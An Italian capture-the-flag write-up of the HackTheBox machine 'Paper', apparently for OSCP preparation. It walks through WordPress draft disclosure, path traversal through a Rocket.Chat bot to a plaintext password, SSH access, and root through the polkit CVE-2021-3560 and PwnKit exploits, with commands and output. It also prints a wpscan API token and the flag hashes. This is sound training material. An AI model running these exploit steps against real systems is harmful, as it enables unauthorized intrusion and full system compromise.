**TARGET: 10.10.11.143**

# INFORMATION GATHERING

Per prima cosa lanciamo un veloce scan con [Nmap](Note/Tool/Nmap.md)
```bash
┌──(root㉿kali)-[/home/kali/htb/paper]
└─# nmap -sC -sS -sV --min-rate=5000 10.10.11.143
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 11:08 EDT
Nmap scan report for 10.10.11.143
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| tls-alpn:
|_  http/1.1
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.62 seconds
```

Uno ulteriore scan su tutte le porte non ci da nessuna nuova informazione.

# ENUMERATION

# Port 80/443

Iniziamo a visitare `10.10.11.143:80` 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper.png)
Entrambi i siti HTTP e HTTPS mostrano solo una pagina Apache CentOs predefinita:

Sorprendentemente, la pagina predefinita non viene caricata come index.html su nessuna delle porte. Una nota interessante è che la pagina predefinita ritorna con una risposta HTTP 403 Forbidden (e non 200 OK). Non sono sicuro che significhi qualcosa, ma è interessante.

Anche gli  HTTP response headers su 443 non forniscono alcuna informazione aggiuntiva. Ma c'è un'intestazione extra su 80:

```
HTTP/1.1 403 Forbidden 
Date: Sat, 04 Jun 2022 20:42:12 GMT 
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 
X-Backend-Server: office.paper 
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT 
ETag: "30c0b-5c5c7fdeec240" 
Accept-Ranges: bytes 
Content-Length: 199691 
Connection: close 
Content-Type: text/html; charset=UTF-8
```

Aggiungiamolo al nostro `/etc/hosts`

# paper.office:80

Visitiamo `http://office.paper`
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper1.png)

Si tratta chiaramente di un'opera teatrale sull'azienda tratta dallo show televisivo "The Office", incentrato su un'azienda cartaria chiamata Dunder Mifflin.

Ci sono tre post, tutti di Prisonmike, e tutti con un personaggio simile allo stupido capo dello show televisivo. C'è un commento su uno dei post che contiene un suggerimento:
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper2.webp)
Mi assicurerò di controllare le bozze dei post se riesco a trovare l'accesso.

Esplorando un po il sito vediamo che realizzato in WordPress, potrebbe essere una buona idea utilizzare [Wpscn](Note/Tool/Wpscn.md) per analizzare eventuali vulnerabilità note sia nella versione che eventualmente nei plugin installati.

```bash
┌──(root㉿kali)-[/home/kali/htb/paper]
└─# wpscan --url http://office.paper --api-token aFEiZnsEMbUOSsvssz1pEPejgvMFBxpOTLpUoElyRCM
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Fri Oct 27 03:06:42 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |
 | [!] 57 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.2.13
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 ...<snip>...

 ...<snip>...


[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Fri Oct 27 03:06:58 2023
[+] Requests Done: 173
[+] Cached Requests: 5
[+] Data Sent: 42.631 KB
[+] Data Received: 203.885 KB
[+] Memory used: 259.922 MB
[+] Elapsed time: 00:00:16
```

Wpscan rileva che la versione di WP è 5.2.3:
Ci sono 32 vulnerabilità conosciute in questa versione ma in base all'indizio di prima ci contriamo su questa

```bash
 [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
```

Dovrebbe permetterci di vedere le bozze a cui si face riferimento del post.

[Qui](https://www.exploit-db.com/exploits/47690)possiamo vedere l'exploit

```md
So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format


In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```

Dobbiamo aggiungere al link `?static=1` e riusciamo a visualizzare il post segreto 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper3.png)
si fa riferimento ad un sistema di chat per dipendenti al seguente url `http://chat.office.paper/register/8qozr226AhkCHZdyY`

come possiamo vedere del url abbiamo un sottodominio `caht.office.paper` che andremo ad aggiungere al nostro `/etc/hosts` prima di visitarlo 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper4.png)
Abbiamo un form di registrazione di `rocket.chat`
ci registriamo e siamo dentro 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper5.webp)

Il canale `#general` ha un sacco di personaggi dello show televisivo e alcune belle battute, ma anche qualcosa su Dwight che programma un bot:
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper6.webp)

I punti più interessanti:

recyclops help mostrerà i comandi
recyclops può ottenere file ed elencare file
questo canale è di sola lettura
recyclops può essere raggiunto tramite DM (messaggio diretto).
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper7.png)
Vediamo se possiamo muoverci tra le directory

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper8.png)
Ok possiamo muoverci tra le directory 
vedo anche un user.txt ma mi da accesso negato.

Cercando su google rocket.chat bot troviamo [questa pagina](https://github.com/RocketChat/hubot-rocketchat) dove vediamo che il file di configurazione del  bot e nel file  `.env` vediamo se lo troviamo 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper9.png)

Ed eccolo qui al percorso `../hubot/.env` abbiamo un 
user `recyclops` 
e una password `Queenofblad3s!23`

leggendo il file `etc/passwd` vediamo che `dwight`  è un utente normale con una directory home diversa da rocketchat

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/paper10.png)Dato l'accesso ai file in /home/dwight, è logico che il bot venga eseguito come dwight. 
perchiò proviamo ad accervi trammite ssh

```bash
┌──(root㉿kali)-[/home/kali/htb/paper]
└─# ssh dwight@10.10.11.143
The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
dwight@10.10.11.143's password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 
```

e abbiamo la nostra user flag

```bash
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat user.txt
e1fc937f2dd51f0a60183222499255cf
[dwight@paper ~]$
```

# PRIVESC

Scarichiamo sulla macchina target [[LinEPAS.sh]] e lo eseguiamo 

```bash
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
lsb_release Not Found

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.29

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

```

Possiamo vedere che il CVEs Check ci segnala che la macchina è vulnerabile alla [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
> [!NOTA ] l'ultima versione di LinEPAS.sh (2023) NON rileva la CVE. ho trovato [questi](https://github.com/carlospolop/PEASS-ng/issues/339) riferimenti che sarebbero d'approfondire 

## CVE-2021-3560-Polkit-Privilege-Esclation

In Linux, polkit è un servizio di autorizzazione utilizzato per consentire ai processi non privilegiati di comunicare con processi privilegiati. Quando un utente o un processo con privilegi limitati desidera accedere a risorse che richiedono privilegi più elevati, il servizio di autorizzazione polkit prende una decisione di autorizzazione o negazione dietro le quinte oppure richiede una finestra di dialogo per ricevere ulteriore autorizzazione prima di concedere i privilegi necessari.
CVE-2021-3560 è una vulnerabilità di bypass dell'autenticazione che consente a un utente normale di elevare i propri privilegi a quelli di un utente root. Questo difetto potrebbe essere utilizzato da un utente locale non privilegiato per creare un nuovo amministratore locale, il che si traduce nella completa compromissione del sistema. Informazioni dettagliate sul funzionamento di CVE-2021-3560 possono essere trovate qui.

Durante la ricerca, troviamo questo [PoC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) su Github. 
Scarichiamo questo exploit e trasferiamolo sull'host remoto. 
```bash
[dwight@paper ~]$ wget 10.10.14.9:8000/poc.sh
--2023-10-31 08:09:34--  http://10.10.14.9:8000/poc.sh
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9627 (9.4K) [text/x-sh]
Saving to: ‘poc.sh’

poc.sh                                                     100%[========================================================================================================================================>]   9.40K  --.-KB/s    in 0.01s

2023-10-31 08:09:35 (654 KB/s) - ‘poc.sh’ saved [9627/9627]

[dwight@paper ~]$ ls
bot_restart.sh  hubot  poc.sh  sales  user.txt
[dwight@paper ~]$ chmod +x poc.sh
[dwight@paper ~]$ ls
bot_restart.sh  hubot  poc.sh  sales  user.txt
[dwight@paper ~]$
```

Possiamo utilizzare le opzioni di flag disponibili nello script di prova per impostare il nome utente e la password desiderati per il nuovo utente oppure modificare direttamente il nome utente e la password codificati nel codice PoC stesso. 

```bash
[dwight@paper ~]$ ./poc.sh -u=xrabbit -p=test123

[!] Username set as : xrabbit
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username xrabbit...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username xrabbit  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - xrabbit
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$

```

l' output ci dice che è stato creato un nuovo utente con le credenziali specificate. Confermiamolo passando al nuovo utente, eseguiamo sudo bash e siamo root

```bash
[dwight@paper ~]$ su xrabbit
Password:
[xrabbit@paper dwight]$ sudo bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for xrabbit:
[root@paper dwight]#
```

ed ecco la nostra root flag

```bash
[root@paper dwight]# cat /root/root.txt
957c77b4e47ddd8ec41c0a53b923874b
```

## PwnKit

LinEPAS ci suggerisce diversi vulnerabilità come possiamo vedere.

```bash

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

### PwnKit - Fail

CVE-2021-4034 è un altro bug scoperto da Qualys, questa volta in pkexec, denominato PwnKit. [Questo post](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) del blog entra in tutti i dettagli. L'exploit abusa della cattiva gestione di un argc vuoto (dove i parametri vengono passati a un programma Linux) per ottenere l'esecuzione tramite pkexec che viene eseguito come root (tramite SetUID) per impostazione predefinita.

La versione di pkexec su Paper è probabilmente vulnerabile a questo exploit, ma c'è un problema:

```bash
[dwight@paper ~]$ ls -l /usr/bin/pkexec
-rwxr-xr-x. 1 root root 29816 May 11  2019 /usr/bin/pkexec
```

pkexec non è impostato come SetUID e quindi sfruttarlo restituirà solo l'esecuzione come utente che lo esegue, il che non è utile.

Notando che pkexec non era SetUID, ho rinunciato a PwnKit e sono passato ad altre cose (che è una cosa ragionevole da fare). Volevo tornare e giocarci ora che ho accesso root.

Prenderò un POC praticamente a caso (scelgo [questo](https://github.com/luijait/PwnKit-Exploit/blob/main/exploit.c) di luijait). Salverò una copia di exploit.c su Paper e poi lo compilerò:

```bash
[dwight@paper dwight]# cc -Wall exploit.c -o exploit
[dwight@paper dwight]# ls -l
total 812
-rwxr-xr-x 1 dwight dwight   1174 Sep 16  2021 bot_restart.sh
-rwxr-xr-x 1 root   root    21992 Nov  2 09:20 exploit
-rw-r--r-- 1 root   root     1546 Nov  2 09:20 exploit.c
drwx------ 8 dwight dwight   4096 Sep 16  2021 hubot
-rwxrwxr-x 1 dwight dwight 776776 Oct 30 08:21 linpeas2022.sh
-rwxrwxr-x 1 dwight dwight   9627 Oct 27 11:14 poc.sh
drwxr-xr-x 4 dwight dwight     32 Jul  3  2021 sales
-r-------- 1 dwight dwight     33 Nov  2 08:51 user.txt
```

Lo eseguo e si lamenta che "pkexec deve essere setuid root":

```bash
[dwight@paper ~]$ ./exploit
Current User before execute exploit
hacker@victim$whoami: dwight
Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory ‘GCONV_PATH=.’: File exists
mkdir: cannot create directory ‘tmp’: File exists
sh: tmp/b64load.c: Permission denied
/usr/bin/ld: cannot open output file tmp/pwnkit.so: Permission denied
collect2: error: ld returned 1 exit status
sh: tmp/gconv-modules: Permission denied

[+] Enjoy your root if exploit was completed succesfully
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec must be setuid root
```

### Re-SetUID pwnkit

Come root, cambierò pkexec con le autorizzazioni SetUID:

```bash
[root@paper dwight]#  chmod 4755 /usr/bin/pkexec
[root@paper dwight]# ls -l /usr/bin/pkexec
-rwsr-xr-x. 1 root root 29816 May 11  2019 /usr/bin/pkexec
```

Tornato nella shell come Dwight, proverò di nuovo l'exploit:

```bash
[dwight@paper ~]$ ./exploit
Current User before execute exploit
hacker@victim$whoami: dwight
Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory ‘GCONV_PATH=.’: File exists
mkdir: cannot create directory ‘tmp’: File exists
sh: tmp/b64load.c: Permission denied
/bin/ld: cannot open output file tmp/pwnkit.so: Permission denied
collect2: error: ld returned 1 exit status
sh: tmp/gconv-modules: Permission denied

[+] Enjoy your root if exploit was completed succesfully
[root@paper dwight]# id
uid=0(root) gid=0(root) groups=0(root),1004(dwight)
```